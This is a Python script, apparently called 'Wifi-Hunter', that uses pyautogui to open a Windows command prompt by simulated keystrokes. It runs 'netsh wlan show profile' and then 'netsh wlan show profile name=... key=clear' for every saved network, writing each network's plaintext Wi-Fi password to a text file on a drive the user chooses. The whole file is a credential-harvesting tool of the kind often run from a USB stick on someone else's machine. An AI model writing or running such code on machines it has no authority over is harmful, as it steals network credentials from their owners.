from netrc import netrc
import pyautogui
import time
import os

#pyautogui.FAILSAFE = False
driveKilljoy = str(input())

if (os.path.getsize("netsh-profile.txt")) == 0:
    netshprof = False    # Empty
else:
    netshprof = True    # Empty

if (os.path.getsize("netsh-key.txt")) == 0:
    netshkey = False    # Empty
else :
    netshkey = True   # Empty

#------------------------------------------------------------------------
def main():
    if netshprof == 0 and netshkey == 0:
        OpenCmd()
        getnetshprofile()
        getnetshkey()

#------------------------------------------------------------------------

def OpenCmd():
    pyautogui.hotkey('win', 'r')
    time.sleep(0.5)
    pyautogui.write('cmd')
    time.sleep(0.5)
    pyautogui.press('enter')
    time.sleep(2.5)

#------------------------------------------------------------------------

def getnetshprofile():
    pyautogui.write(driveKilljoy)
    pyautogui.write(':')
    pyautogui.press('enter')
    time.sleep(0.1)
    #pyautogui.write('cd Python Saves\Killjoy\Wifi-Hunter')
    #pyautogui.press('enter')
    #time.sleep(0.1)
    pyautogui.write('netsh wlan show profile > netsh-profile.txt')
    pyautogui.press('enter')
    time.sleep(1)

#------------------------------------------------------------------------

def getnetshkey():
    filter = 'All User Profile'
    with open('netsh-profile.txt') as profile:
        data = profile.read()
        print(data)
        profcount = data.count(filter)
        networks = data.split("All User Profile     : ", profcount)
        filternetworks = []
        for i in networks:
            filternetworks.append(i.strip())
        print(filternetworks)
        #print(networks[1])
        #print(profcount)
        i = profcount
        while i > 0:
            a = 'netsh wlan show profile name= '
            b = str(filternetworks[i])
            c = ' key=clear'
            d = ' > '
            filternetworks[i] = filternetworks[i].replace(" ", ".")
            filternetworks[i] = filternetworks[i].replace("|", "")
            filternetworks[i] = filternetworks[i].replace("/", "")
            filternetworks[i] = filternetworks[i].replace(":", "")
            filternetworks[i] = filternetworks[i].replace("*", "")
            filternetworks[i] = filternetworks[i].replace("?", "")
            filternetworks[i] = filternetworks[i].replace(" "" ", "")
            filternetworks[i] = filternetworks[i].replace("<", "")
            filternetworks[i] = filternetworks[i].replace("<", "")
            e = str(filternetworks[i])
            f = '.txt'
            command = str(a + b + c + d + e + f)
            #print('netsh wlan show profile name= ', end = "")
            #print(str(networks[i]), end = "")
            #print('key=clear')
            time.sleep(.5)
            print(command)
            pyautogui.write(command)
            pyautogui.press('enter')
            #print('netsh wlan show profile name=' ,(networks[i]) ,'key=clear ' ,' > ' ,str(i) ,'.txt')
            i -= 1

#------------------------------------------------------------------------

main()

#------------------------------------------------------------------------